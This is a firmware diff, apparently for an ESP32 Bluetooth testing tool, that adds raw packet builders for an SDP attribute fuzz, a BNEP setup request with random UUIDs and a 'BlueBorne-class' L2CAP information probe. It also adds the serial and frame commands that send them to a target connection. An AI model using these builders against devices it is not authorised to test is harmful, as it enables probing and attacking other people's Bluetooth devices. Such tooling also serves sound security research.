@@ -1491,6 +1491,57 @@ static void vhciProbe() {
   Serial.printf("[vhci] available=%d\n", (int)av);
 }
 
+// --- Fase C.2: payload builder dedicati (SDP / BNEP / BlueBorne-class) ---
+static uint8_t vhciLast[96];
+static uint16_t vhciLastLen = 0;
+
+static void vhciDumpLast() {
+  Serial.printf("[vhci] last=%uB ", vhciLastLen);
+  for (int i = 0; i < vhciLastLen; i++) Serial.printf("%02X", vhciLast[i]);
+  Serial.println();
+}
+
+// SDP Service Search Attribute Request (PDU 0x06) con attribute range 0x0000-0xFFFF
+static int vhciSdpFuzz(uint16_t handle, uint16_t cid) {
+  uint8_t p[40];
+  int n = 0;
+  p[n++] = 0x06; p[n++] = 0x01; p[n++] = 0x00;
+  int lenPos = n; p[n++] = 0; p[n++] = 0;
+  p[n++] = 0x35; p[n++] = 0x03; p[n++] = 0x19; p[n++] = 0x01; p[n++] = 0x00;
+  p[n++] = 0xFF; p[n++] = 0xFF;
+  p[n++] = 0x35; p[n++] = 0x05; p[n++] = 0x0A; p[n++] = 0x00; p[n++] = 0x00; p[n++] = 0xFF; p[n++] = 0xFF;
+  uint16_t dlen = (uint16_t)(n - 5);
+  p[lenPos] = (uint8_t)(dlen >> 8);
+  p[lenPos + 1] = (uint8_t)(dlen & 0xFF);
+  memcpy(vhciLast, p, n);
+  vhciLastLen = (uint16_t)n;
+  return vhciL2capRaw(handle, cid, p, (uint16_t)n) ? n : -1;
+}
+
+// BNEP SETUP CONNECTION REQUEST (L2CAP PSM 0x000F, dopo connect)
+static int vhciBnepCraft(uint16_t handle, uint16_t cid) {
+  uint8_t p[20];
+  int n = 0;
+  p[n++] = 0x01;  // BNEP_SETUP_CONN_REQ
+  for (int i = 0; i < 16; i++) p[n++] = (uint8_t)(esp_random() & 0x0F);  // dst+src UUID128 random
+  memcpy(vhciLast, p, n);
+  vhciLastLen = (uint16_t)n;
+  return vhciL2capRaw(handle, cid, p, (uint16_t)n) ? n : -1;
+}
+
+// BlueBorne-class: L2CAP Information Request su signaling (CID 0x0001),
+// codice Extended Features (0x0002/0x0003) con identifier incrementale.
+static uint16_t vhciInfoIdent = 0x40;
+static int vhciBlueBorneProbe(uint16_t handle) {
+  uint8_t p[4];
+  p[0] = 0x0A;                    // L2CAP_INFO_REQ
+  p[1] = (uint8_t)(vhciInfoIdent++ & 0xFF);
+  p[2] = 0x02; p[3] = 0x00;       // InfoType: Extended Features
+  memcpy(vhciLast, p, 4);
+  vhciLastLen = 4;
+  return vhciL2capRaw(handle, 0x0001, p, 4) ? 4 : -1;
+}
+
 static int bleMtuBurst(uint8_t count) {
   if (!bleGattcReady || bleConnCount == 0) return -1;
   uint16_t cid = bleConnIds[bleConnCount - 1];
@@ -2109,6 +2160,40 @@ static void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
       break;
     }
 
+    case 0x53: {  // sdp attribute fuzz [h lo][h hi][cid lo][cid hi]
+      if (plen < 4) { sendFrame(0x53, 0x02, (const uint8_t *)"bad args", 8); break; }
+      uint16_t h = (uint16_t)(pl[0] | (pl[1] << 8));
+      uint16_t cid = (uint16_t)(pl[2] | (pl[3] << 8));
+      int n = vhciSdpFuzz(h, cid);
+      uint8_t out[3] = {(uint8_t)(n > 0 ? 1 : 0), (uint8_t)(vhciLastLen & 0xFF), (uint8_t)(vhciLastLen >> 8)};
+      sendFrame(0x53, n > 0 ? 0x00 : 0x02, out, 3);
+      break;
+    }
+
+    case 0x54: {  // bnep frame craft [h lo][h hi][cid lo][cid hi]
+      if (plen < 4) { sendFrame(0x54, 0x02, (const uint8_t *)"bad args", 8); break; }
+      uint16_t h = (uint16_t)(pl[0] | (pl[1] << 8));
+      uint16_t cid = (uint16_t)(pl[2] | (pl[3] << 8));
+      int n = vhciBnepCraft(h, cid);
+      uint8_t out[3] = {(uint8_t)(n > 0 ? 1 : 0), (uint8_t)(vhciLastLen & 0xFF), (uint8_t)(vhciLastLen >> 8)};
+      sendFrame(0x54, n > 0 ? 0x00 : 0x02, out, 3);
+      break;
+    }
+
+    case 0x55: {  // blueborne-class l2cap info probe [h lo][h hi]
+      if (plen < 2) { sendFrame(0x55, 0x02, (const uint8_t *)"bad args", 8); break; }
+      uint16_t h = (uint16_t)(pl[0] | (pl[1] << 8));
+      int n = vhciBlueBorneProbe(h);
+      uint8_t out[2] = {(uint8_t)(n > 0 ? 1 : 0), (uint8_t)vhciInfoIdent};
+      sendFrame(0x55, n > 0 ? 0x00 : 0x02, out, 2);
+      break;
+    }
+
+    case 0x56: {  // ultimo pacchetto craftato (hex)
+      sendFrame(0x56, 0x00, vhciLast, vhciLastLen);
+      break;
+    }
+
     default:
       sendFrame(cmd, 0x03, (const uint8_t *)"unknown cmd", 11);
   }
@@ -2329,6 +2414,24 @@ void loop() {
         uint8_t psmReq[2] = {0x01, 0x00};
         bool ok = vhciL2capRaw(0x0000, 0x0001, psmReq, 2);
         Serial.printf("[vhci] raw send=%d avail=%d\n", (int)ok, (int)esp_vhci_host_check_send_available());
+      }
+      else if (serCmd == "$") {
+        vhciDumpLast();
+      }
+      else if (serCmd == "%") {
+        int n = vhciBlueBorneProbe(0x0000);
+        Serial.printf("[vhci] blueborne probe n=%d\n", n);
+        vhciDumpLast();
+      }
+      else if (serCmd == "&") {
+        int n = vhciBnepCraft(0x0000, 0x0040);
+        Serial.printf("[vhci] bnep craft n=%d\n", n);
+        vhciDumpLast();
+      }
+      else if (serCmd == "@") {
+        int n = vhciSdpFuzz(0x0000, 0x0040);
+        Serial.printf("[vhci] sdp fuzz n=%d\n", n);
+        vhciDumpLast();
       }
       else if (serCmd.startsWith("V")) {
         int ok = bleMtuBurst(serCmd.length() > 1 ? (uint8_t)serCmd.substring(1).toInt() : 8);
